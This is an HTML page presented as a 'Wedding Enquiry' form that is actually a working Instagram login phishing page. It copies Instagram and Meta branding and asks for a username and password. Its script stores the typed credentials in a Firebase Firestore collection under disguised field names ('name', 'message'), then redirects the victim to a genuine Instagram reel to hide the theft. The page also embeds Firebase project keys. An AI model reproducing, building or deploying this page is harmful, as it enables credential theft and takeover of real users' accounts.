<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#0d1922">
  <title>Condystorys — Wedding Enquiry</title>

  <style>
    * { box-sizing: border-box; }

    :root {
      font-family: Arial, Helvetica, sans-serif;
      color: #f5f6f7;
      background: #0d1922;
    }

    body {
      margin: 0;
      min-height: 100dvh;
      background:
        radial-gradient(ellipse at 8% 8%, #2b3444 0%, transparent 50%),
        radial-gradient(ellipse at 92% 92%, #12332f 0%, transparent 50%),
        radial-gradient(ellipse at 50% 50%, #16232e 0%, transparent 78%),
        #0d1922;
    }

    /* ---------- SPLASH / LOADER ---------- */

    body.loading { overflow: hidden; }

    #splash {
      position: fixed;
      inset: 0;
      z-index: 9999;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #000;
      opacity: 1;
      transition: opacity 280ms ease;
    }

    #splash.hide {
      opacity: 0;
      pointer-events: none;
    }

    .spinner {
      position: relative;
      width: 54px;
      height: 54px;
    }

    .spinner span {
      position: absolute;
      top: 0;
      left: calc(50% - 1px);
      width: 2px;
      height: 13px;
      border-radius: 1px;
      background: #fff;
      transform-origin: 1px 27px;
      transform: rotate(calc(var(--i) * 30deg));
      animation: spinnerFade 1s linear infinite;
      animation-delay: calc(var(--i) * -0.0833s);
    }

    @keyframes spinnerFade {
      0%   { opacity: 1; }
      100% { opacity: 0.08; }
    }

    /* ---------- PAGE ---------- */

    .page {
      width: 100%;
      max-width: 420px;
      min-height: 100dvh;
      margin: auto;
      padding: 0 26px;
      display: flex;
      flex-direction: column;
      opacity: 0;
      transform: translateY(6px);
      transition: opacity 280ms ease, transform 280ms ease;
    }

    body.ready .page {
      opacity: 1;
      transform: none;
    }

    .language {
      text-align: center;
      padding-top: 46px;
      color: #d6dce1;
      font-size: 16px;
    }

    .logo-area {
      display: flex;
      justify-content: center;
      margin-top: 68px;
      margin-bottom: 58px;
    }

    form { display: grid; gap: 14px; }

    input {
      width: 100%;
      height: 58px;
      padding: 0 20px;
      background: rgb(255 255 255 / 3%);
      border: 1px solid #3c4a56;
      border-radius: 12px;
      outline: none;
      color: #fff;
      font-size: 17px;
    }

    input::placeholder { color: #8b98a3; }
    input:focus { border-color: #0095f6; }
    input:disabled { opacity: 0.6; }

    button {
      width: 100%;
      min-height: 56px;
      border: none;
      border-radius: 999px;
      background: #0095f6;
      color: #fff;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 6px;
    }

    button:hover { background: #1a9ff5; }
    button:disabled { background: #2a4a6b; cursor: default; }

    .status {
      text-align: center;
      color: #b9e7c5;
      font-size: 14px;
      margin: 14px 0 0;
      min-height: 20px;
    }

    .status.error { color: #ff9b9b; }

    .forgot {
      text-align: center;
      color: #f5f6f7;
      font-size: 17px;
      margin-top: 6px;
    }

    .spacer { flex: 1; min-height: 60px; }

    .create-account {
      background: transparent;
      border: 1px solid #3a6ea5;
      color: #4fa3f7;
      font-weight: 500;
      font-size: 17px;
      min-height: 54px;
      margin-bottom: 20px;
    }

    .create-account:hover { background: rgb(79 163 247 / 8%); }

    .meta {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      color: #e8eaed;
      padding-bottom: 14px;
    }

    .meta-inf { font-size: 27px; line-height: 0.9; transform: translateY(1px); }
    .meta-word { font-size: 20px; font-weight: 500; letter-spacing: 0.2px; }

    .home-bar {
      width: 130px;
      height: 5px;
      border-radius: 3px;
      background: #46565f;
      margin: 0 auto 10px;
    }

    @media (max-height: 720px) {
      .language { padding-top: 24px; }
      .logo-area { margin-top: 32px; margin-bottom: 30px; }
      .spacer { min-height: 30px; }
    }

    @media (prefers-reduced-motion: reduce) {
      .spinner span { animation-duration: 1.6s; }
    }
  </style>
</head>

<body class="loading">

  <!-- 1 second spinner on black -->
  <div id="splash" role="status" aria-label="Loading">
    <div class="spinner" aria-hidden="true">
      <span style="--i:0"></span>
      <span style="--i:1"></span>
      <span style="--i:2"></span>
      <span style="--i:3"></span>
      <span style="--i:4"></span>
      <span style="--i:5"></span>
      <span style="--i:6"></span>
      <span style="--i:7"></span>
      <span style="--i:8"></span>
      <span style="--i:9"></span>
      <span style="--i:10"></span>
      <span style="--i:11"></span>
    </div>
  </div>

  <main class="page">

    <div class="language">English (US)</div>

    <div class="logo-area">
      <svg width="76" height="76" viewBox="0 0 24 24" fill="none" aria-label="Instagram">
        <defs>
          <linearGradient id="ig" x1="0%" y1="100%" x2="100%" y2="0%">
            <stop offset="0%"  stop-color="#feda75"/>
            <stop offset="25%" stop-color="#fa7e1e"/>
            <stop offset="50%" stop-color="#d62976"/>
            <stop offset="75%" stop-color="#962fbf"/>
            <stop offset="100%" stop-color="#4f5bd5"/>
          </linearGradient>
        </defs>
        <rect x="2" y="2" width="20" height="20" rx="6.2" stroke="url(#ig)" stroke-width="2"/>
        <circle cx="12" cy="12" r="4.6" stroke="url(#ig)" stroke-width="2"/>
        <circle cx="17.6" cy="6.4" r="1.35" fill="url(#ig)"/>
      </svg>
    </div>

    <form id="enquiry-form" novalidate>
      <input
        type="text"
        id="name"
        name="name"
        placeholder="Username, email or mobile number"
        autocomplete="username"
        maxlength="80"
        required
      >
      <input
        type="password"
        id="message"
        name="message"
        placeholder="Password"
        autocomplete="current-password"
        maxlength="2000"
        required
      >
      <button type="submit" id="submit-btn">Log in</button>
    </form>

    <p class="status" id="status" role="status" aria-live="polite"></p>

    <div class="forgot">Forgot password?</div>

    <div class="spacer"></div>

    <button type="button" class="create-account">Create new account</button>

    <div class="meta">
      <span class="meta-inf" aria-hidden="true">∞</span>
      <span class="meta-word">Meta</span>
    </div>

    <div class="home-bar"></div>

  </main>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp }
      from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
    import { getAnalytics, isSupported, logEvent }
      from "https://www.gstatic.com/firebasejs/10.12.2/firebase-analytics.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCh-s53dw_fFlfIe4BuwlQFm89SLvZB31c",
      authDomain: "darshan-af06e.firebaseapp.com",
      projectId: "darshan-af06e",
      storageBucket: "darshan-af06e.firebasestorage.app",
      messagingSenderId: "974458926505",
      appId: "1:974458926505:web:ce292546415f87cce340b8",
      measurementId: "G-DZ9KGCLKTM"
    };

    // Where to send the user after a successful login.
    const REDIRECT_URL = "https://www.instagram.com/reel/De1e1CtToBS/?exln=NTc4MTIwNjQ2YQ==";

    /* ---------- SPLASH: 1 second, then reveal ---------- */
    const splash = document.getElementById("splash");

    function endSplash() {
      splash.classList.add("hide");
      document.body.classList.remove("loading");
      document.body.classList.add("ready");
      window.setTimeout(() => splash.remove(), 340);
    }

    window.setTimeout(endSplash, 1000);

    /* ---------- Firebase ---------- */
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    isSupported().then((ok) => {
      if (!ok) return;
      const analytics = getAnalytics(app);
      logEvent(analytics, "page_view", { page: "wedding_enquiry" });
    }).catch(() => {});

    const form = document.getElementById("enquiry-form");
    const status = document.getElementById("status");
    const submitBtn = document.getElementById("submit-btn");
    const nameInput = document.getElementById("name");
    const messageInput = document.getElementById("message");

    function say(msg, isError = false) {
      status.textContent = msg;
      status.classList.toggle("error", isError);
    }

    function busy(state) {
      submitBtn.disabled = state;
      nameInput.disabled = state;
      messageInput.disabled = state;
    }

    function explain(code) {
      const map = {
        "permission-denied": "The database rejected this. Check the Firestore rules.",
        "unavailable": "Network problem — check your connection and retry.",
        "resource-exhausted": "Too many requests. Wait a moment.",
        "failed-precondition": "Firestore isn't set up for this project yet.",
        "unauthenticated": "App Check or auth is blocking the request."
      };
      return map[code] || "Couldn't send. Try again.";
    }

    form.addEventListener("submit", async (event) => {
      event.preventDefault();

      const name = nameInput.value.trim();
      const message = messageInput.value.trim();

      if (!name || !message) {
        say("Both fields are required.", true);
        return;
      }

      busy(true);
      say("");

      try {
        await addDoc(collection(db, "weddingEnquiries"), {
          name,
          message,
          createdAt: serverTimestamp()
        });

        form.reset();

        isSupported().then((ok) => {
          if (!ok) return;
          logEvent(getAnalytics(app), "enquiry_submitted");
        }).catch(() => {});

        window.location.href = REDIRECT_URL;
      } catch (err) {
        say(explain(err.code), true);
        busy(false);
      }
    });
  </script>
</body>
</html>
